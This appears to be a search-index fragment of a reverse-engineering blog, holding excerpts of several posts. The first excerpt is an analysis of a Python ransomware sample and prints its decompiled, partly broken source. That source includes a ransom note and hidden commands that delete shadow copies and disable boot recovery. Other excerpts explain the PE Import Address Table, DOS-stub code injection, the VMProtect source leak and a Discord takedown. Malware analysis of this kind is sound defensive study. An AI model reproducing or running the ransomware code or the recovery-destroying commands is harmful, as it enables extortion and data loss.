import random import os import secrets from cryptography.hazmat.primitives.asymmetric import padding from cryptography.hazmat.primitives import serialization, hashes from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes from cryptography.hazmat.backends import default_backend PUBLIC_KEY_PEM = '-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDzOPVPDhQAR/xYjucI5SdCugXS\\nG9ZFk5C1It85dOvh+fmD1UNXs5h3R28hUtThRARNh2ar3ADlGGWHIKwoV4P5hZx4\\nq2Cg4odgWrf7a5eskCu3fI4eCTKBSItuEs4nFrjdu6HDXnzVHDkxrkWY96mmoZ9R\\n0zG8Kyo6ofuge9p2IwIDAQAB\\n-----END PUBLIC KEY-----' AES_KEY_PATH = 'C:\\\\ProgramData\\\\02dq34jROu.key' USER_PATH = os.path.expanduser('~') TARGET_DIRS = ['Downloads', 'Music', 'Documents', 'Desktop', 'Videos', 'Pictures'] EXTENSION = '.02dq34jROu'  def _34EYLBSVGLRLCR7DM4():     return serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode(), backend=default_backend())  def _JXOPHO2CGWP23DL9L1():     aes_key = secrets.token_bytes(32)     public_key = _34EYLBSVGLRLCR7DM4()     encrypted_aes_key = public_key.encrypt(aes_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))     with open(AES_KEY_PATH, 'wb') as key_file:         key_file.write(encrypted_aes_key)         return aes_key  def _0HAHESD3QA17F3OWF7():     if not os.path.exists(AES_KEY_PATH):         return _JXOPHO2CGWP23DL9L1()  def _SSJAVGM86I7CGWDH9W(file_path, aes_key):     if not file_path.endswith(EXTENSION) and (not file_path.endswith('.exe')) and (not file_path.endswith('.dll')) and file_path.endswith('.lnk'):         pass  # postinserted     return None  def _LLIRBGOWCAMFAVUTAK():     global aes_key  # inserted     contentof = '-- Lyrix\\n\\nYour data has been encrypted and stolen. The only way to recover it is by contacting us.\\nDo not attempt to use third-party recovery tools ‚Äî doing so may permanently damage your files.\\n\\nTo prove that decryption is possible, we are willing to decrypt 2 random files for free.\\n\\nYou can contact us at:\\nTDVP7boZDZDE4GYWA3qW@protonmail.com\\n\\nWARNING!\\nWe have also downloaded a portion of your data. If you do not pay, we will release it publicly.\\n\\nID: KVNR2HLU3N9W5BQCPU\\n    '     aes_key = _0HAHESD3QA17F3OWF7()     print('AES key already exists. Skipping key generation.') if not aes_key else None     appdata_dir = os.path.join(USER_PATH, 'AppData').lower()     for root, dirs, files in os.walk(USER_PATH):         root_normalized = os.path.abspath(root).lower()         if root_normalized.startswith(appdata_dir):             continue         readme_path = os.path.join(root, 'README.txt')         try:             with open(readme_path, 'w', encoding='utf-8') as readme_file:                 readme_file.write(contentof)                     print(f'Created README.txt in: {root}')                     for file in files:                         file_path = os.path.join(root, file)                         try:                             _SSJAVGM86I7CGWDH9W(file_path, aes_key)                             print(f'File [{file_path}] encrypted')     except Exception as e:         print(f'[WARNING] Failed to create README.txt in {root}: {e}')     except Exception as e:         print(f'[WARNING] Cannot Encrypt file {file_path}: {e}') if __name__ == '__main__':     _LLIRBGOWCAMFAVUTAK() subprocess.Popen('cmd.exe /c vssadmin delete shadows /all /quiet &amp; wmic shadowcopy delete &amp; bcdedit /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW) extensions_to_list = ['.exe', '.dll', '.lnk']  def list_files(drive_path, extensions):     for root, dirs, files in os.walk(drive_path, topdown=True):         for file in files:             if any((file.endswith(ext) for ext in extensions)):                 continue             file_path = os.path.join(root, file)             _SSJAVGM86I7CGWDH9W(file_path, aes_key) for drive_letter in string.ascii_uppercase:     drive_path = f'{drive_letter}:/'     if drive_letter not in ['C'] and os.path.exists(drive_path):         pass  # postinserted     else:  # inserted         try:             list_files(drive_path, extensions_to_list) except PermissionError:     print(f'Access denied to {drive_path}')   Great! So now we managed to get the literal source code itself.   Let‚Äôs explain what the code does step by step:   Source code explanation   Here are the key variables:     PUBLIC_KEY_PEM: The attacker‚Äôs RSA public key, hardcoded into the malware.   AES_KEY_PATH: Where the victim‚Äôs encrypted AES key will be stored: C:\\ProgramData\\02dq34jROu.key. 02dq34jROu is likely a generated ID for the key   TARGET_DIRS: Standard folders to attack first (Downloads, Documents, Desktop, etc.).   EXTENSION: Files will get renamed with the randomly generated ID .02dq34jROu after encryption (this code doesn‚Äôt show the full renaming though).   The malware also uses subprocess.Popen(...) commands to deletes all system shadow copies and disables recovery options:      vssadmin delete shadows /all /quiet   wmic shadowcopy delete   bcdedit /set {default} bootstatuspolicy ignoreallfailures   bcdedit /set {default} recoveryenabled no   This makes it harder to recover files without paying.   list_files(drive_path, extensions)   Walks through a drive letter (like D:/, E:/).   The encryption routine works like this:      For every file, if file is NOT .exe, .dll, or .lnk, it tries to encrypt it.   For every drive letter A: to Z, if the drive exists and is NOT C: (system drive), encrypt files on it.   This ransomware has some bugs and problems, and is likely very ameatur-ish.   ","categories": ["Malware Analysis"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/malware%20analysis/pythonransomware/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/malwareanalysis/pyinstaller/image-1.png"
      },{
        "title": "PE file format: Import Address Table",
        "excerpt":"PE file format: Import Address Table   The Import Address Table stores the memory addresses of external functions that the program uses  Example   Here, we can see that function implementation of MessageBoxA resides in the address 0x75EA05B0 in memory.   user32.dll -&gt; MessageBoxA -&gt; 75EA05B0      When calling MessageBoxA, how does the program know that MessageBoxA resides here 0x75EA05B0?   This is where the Import Address Table comes into play: it contains the RVAs (Relative Virtual Addresses) from the Image Base to the function‚Äôs implementation in memory.   The program uses the Import Address Table to dynamically resolve the addresses of these functions.   Now that we know what the IAT is, let‚Äôs see how to find it programmatically using C and WinAPI.   Programatically finding the IAT   Here‚Äôs how to get to the IAT using WinAPI and C:  // decryptedPE is a BYTE* pointing to the in-memory EXE buffer IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)decryptedPE; IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)(decryptedPE + dosHeader-&gt;e_lfanew); IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD_PTR)imageBase + ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); IMAGE_THUNK_DATA64* firstThunk = (IMAGE_THUNK_DATA64*)((DWORD_PTR)imageBase + importDesc-&gt;FirstThunk); // Locate IAT   Here, firstThunk is a pointer to the Import Address Table in memory.   IAT structure   The IAT itself contains several fields:         u1.AddressOfData: Before loading (on-disk), this is a pointer (RVA) to an IMAGE_IMPORT_BY_NAME structure (where the function name is stored).   u1.Ordinal : If the function is imported by ordinal (number) instead of by name.   u1.ForwarderString: If a function is forwarded, this field contains an RVA to ASCII strings in memory that includes the name of the forwarded module and the function inside it to look for (e.g. NTDLL.RtlExitUserThread).   u1.Function After the loader resolves the import, the u1.Function field is populated with the absolute memory address of the function in memory.  ","categories": ["PE File Format"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/importaddresstable/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/pefileformat/iat/image.png"
      },{
        "title": "PE file format: DOS Header",
        "excerpt":"DOS header   First of all, what‚Äôs the DOS header?   The DOS header is a structure located right at the start of DOS-MZ executables, and preserved on the newer PE format for backwards compatibility. The beginining of the DOS header is marked by the ASCII sequence ‚ÄúMZ‚Äù (4D 5A in hex). Those are the initials of Mark Zbikowski, the designer of the DOS-MZ format.      In Portable Executable files, the DOS header contains an additional DOS stub containing the following ASCII sequence:   \"This program cannot be run in DOS mode.\"     Key fields in the DOS header   WORD e_magic: a 2-byte signature that must equal to MZ (0x4D5A in hexadecimal). This sequence lets the loader know that the file is a valid DOS executable (and by extension, a valid PE file).   LONG e_lfanew: In PE files, this newer 4-byte field contains the offset to the NT header. It‚Äôs relative to e_magic, the MZ signature) which is the start of the file.      In the following example, e_lfanew field corresponds to the byte sequence C8 00 00 00. That means that 0xC8 (ignoring the null values) is the offset to the NT header in modern PE files.   To find the NT header in HxD, let‚Äôs go to offset C8 found in the e_lfanew field, this offset is relative to the file start (0x0):         Can see you see the PE\\0\\0 signature that I highlighted?      This marks the start of the IMAGE_NT_HEADERS structure, and Windows uses e_lfanew to find the offset to that structure.   Below is a diagram I made, illustrating it:      C representation of IMAGE_DOS_HEADER   We can take a look at the contents of the DOS header by looking at the IMAGE_DOS_HEADER structure definition from winnt.h  typedef struct _IMAGE_DOS_HEADER {       WORD e_magic;    // Magic number (MZ)     WORD e_cblp;     // Bytes on last page of file     WORD e_cp;       // Pages in file     WORD e_crlc;     // Relocations     WORD e_cparhdr;  // Size of header in paragraphs     WORD e_minalloc; // Minimum extra paragraphs needed     WORD e_maxalloc; // Maximum extra paragraphs needed     WORD e_ss;       // Initial (relative) SS value     WORD e_sp;       // Initial SP value     WORD e_csum;     // Checksum     WORD e_ip;       // Initial IP value     WORD e_cs;       // Initial (relative) CS value     WORD e_lfarlc;   // File address of relocation table     WORD e_ovno;     // Overlay number     WORD e_res[4];   // Reserved words     WORD e_oemid;    // OEM identifier (for e_oeminfo)     WORD e_oeminfo;  // OEM information; e_oemid specific     WORD e_res2[10]; // Reserved words     LONG e_lfanew;   // File address of new exe header (important!) } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;   The struct has 30 WORD fields (2 bytes each), plus the 4-byte e_lfanew (of size LONG).   Total size: 30 * 2 + 4 = exactly 64 bytes.   Historical background   A lot of you right now may be confused: Why does every PE file need a DOS header, despite modern Windows system not even running DOS programs?   2 words: backwards compatibility.   See, the PE format was designed as an extension of the old DOS MZ executable format. Back then, the Portable Executable format was a new kid on the block. Both DOS-MZ and PE executables were distributed with a .exe extension, so whenever a user attempted to run a PE .exe on MS-DOS, the DOS loaders would behave unexpectedly because they expected a DOS MZ format for .exe extensions, not Portable Executable.   So, in order to make the DOS loaders predictably exit the program upon running a PE executable, Microsoft distributed every PE file with this DOS stub inside the DOS header:   This program cannot be run in DOS mode   So that if a DOS loader tries to execute a PE file, they don‚Äôt crash or hang; instead, they immediately print this message in the console and exit the process.      Looking back, making this ASCII sequence native to every PE file ‚Äúmight‚Äôve‚Äù been a mistake move by MicrosoftüòÖ. The PE format evolved to be a much more powerful and modular format afterward, way more than originally speculated, leaving the DOS-MZ forma to die in the shadows. Yet, every PE file in existence still contains those 36 bytes worth of ASCII bloat, to remind DOS loaders from 40 years ago that our modern .exe file cannot be run on DOS systems.   DOS stub code injection   The DOS header (and the DOS stub) can be modified to inject custom code. Back in the days of DOS-MZ, malware authors would inject their custom 16-bit DOS code into the DOS header itself. Then, when a DOS machine tries to run the modified .exe, it will execute the injected DOS code instead of the boring ‚ÄúThis program cannot be run in DOS mode‚Äù message.   To demonstrate how this is done, I‚Äôll take a random PE executable and replace its DOS stub with a custom 16-bit shellcode to it that prints ‚Äú@AlonAlush‚Äù 5 times in green.   To correctly exit the program after executing our payload, we‚Äôll add the bytes 0x4C01 right after the PE\\0\\0 signature. In 16-bit MS-DOS assembly, the opcode 4C corresponds to the INT 21h function 4CH, which terminates a process with a return code. Following it, 01 is the exit code passed.      Now let‚Äôs run this patched PE in DOSBox, a very popular MS-DOS emulator:      As you can see, instead of printing the generic ‚ÄúThis program cannot be run in DOS mode‚Äù, our exe ran the injected code that printed @AlonAlush name in green 5 times, as we expected. Of course, you can modify the DOS stub to run any 16-bit machine code you‚Äôd like.  ","categories": ["PE File Format"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/pe%20file%20format/dosheader/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/pefileformat/iat/image.png"
      },{
        "title": "The breach of VMProtect: 2 major incidents",
        "excerpt":"VMProtect leak   In 2023, VMProtect, a commercial virtualization-based protector for executable files, was leaked ‚Äî not once, but twice.   First, a dump of the protector popped up in May 2023:      This dump was shared via the Chinese Kanxue Security Forum, frequently used for sharing software cracks:      Then, about half a year later, the more complete archive was leaked (7 Dec 2023) and posted on GitHub:      Timeline           May 2023 : Large chunk of VMProtect 3.x codebase leaked, first public confirmation that the code was in the wild.[1][2][3][4]            December 2023 : A second, packaged dump advertised as the ‚Äúfull‚Äù source was released on Github. Still missing a few files such as the ARM back-end, demanglers, but enough to compile parts of the tool.[1]          There was no evidence of an internal hack at VMPSoft, the consensus is an outsider stole the code (likely from a customer portal or reseller) and leaked it.   Is VMProtect ‚Äúcracked‚Äù now?   Yes and no; having the source code made it possible to partially compile VMProtect:      The core virtualization module (intel.cc) was of main interest to reverse engineers / crackers; in total, it amounted to roughly 31000 lines of raw C++!      The community‚Äôs response   Overall, the reverse engineering community welcomed the breach of VMProtect, with some even describing it as a ‚ÄúChristmas gift‚Äù üéÅ:      securemk thought the breach was an ‚Äúinvaluable resource‚Äù for wannabe reverse engineers like him:      Moving forward   Personally, I see this as a temporary blow to VMProtect‚Äôs reputation in the software protection community. Still, they‚Äôve probably prepared for these kinds of situations, and as of 2025, the protector is still kicking:      I hope you found this post interesting!  ","categories": ["Unpacking"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/unpacking/vmprotectleak/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/unpacking/vmprotectleak/dump.png"
      },{
        "title": "Shapes, Inc got mass-terminated by Discord!",
        "excerpt":"Explaining the Discord controversy   Shapes.inc is a platform that allows users to create and host their so-called ‚ÄúShapes‚Äù, which are AI-powered chatbots that are customizable and personalized.   But here‚Äôs the deal: Their entire Discord server, once a hub for 10 million members! that created, shared, and talked to these Shapes, got completely wiped by Discord in a mass-takedown campaign. Among the terminated apps are the Shapes bots themselves that users created through the Developer Portal API.   Immediately following Discord‚Äôs ban of these bots, the admins quickly responded with a call to action, begging their members into submitting mass-appeals under the reason ‚ÄúShapes did not train AI models on discord user data and messages\":         Allegedly, Shapes violated Discord‚Äôs Developer Terms of Service by illegally collecting the messages that users sent to these bots.   Looking back, this ‚Äúmass-appeal‚Äù campaign ended up harming their reputation even more, because, according to users, they wouldn‚Äôt have insistently denied those claims so blatantly if they truly hadn‚Äôt intended on collecting such data.   Discord later terminated the Discord server itself, as mentioned eariler. Then, the posts became flooding from Shapes members expressing their frustrations.         The community‚Äôs perspective   The community‚Äôs responses regarding the incidents were mixed. Some members harshly criticized Discord‚Äôs perceived overreach when it comes to Discord-hosted projects like these:      Others took a more balanced stance, expressing skepticism regarding Shapes‚Äôs claim of ‚Äúinnocency‚Äù and mentioning how their questionable data collection practices have definitely played a role in the takedown:         Moving forward   I think this is a massive hit to Shapes Inc‚Äôs reputation in the human-AI interaction space, both as a company and as a community. Not only did they handle the situation unprofessionally (instructing clients to appeal in favor of them), but they also didn‚Äôt properly report their data collection practices to Discord, as reported by multiple sources. This isn‚Äôt a mom-and-pop shop, after all; we‚Äôre talking about potentially millions of users who sent private information to these chatbots.   ","categories": ["AI world"],
        "tags": [],
        "url": "https://github.com/pages/Alon-Alush/alonalush.github.io/ai%20world/shapesinctermination/",
        "teaser": "https://github.com/pages/Alon-Alush/alonalush.github.io/assets/images/AI%20world/shapesinc/logo.png"
      }]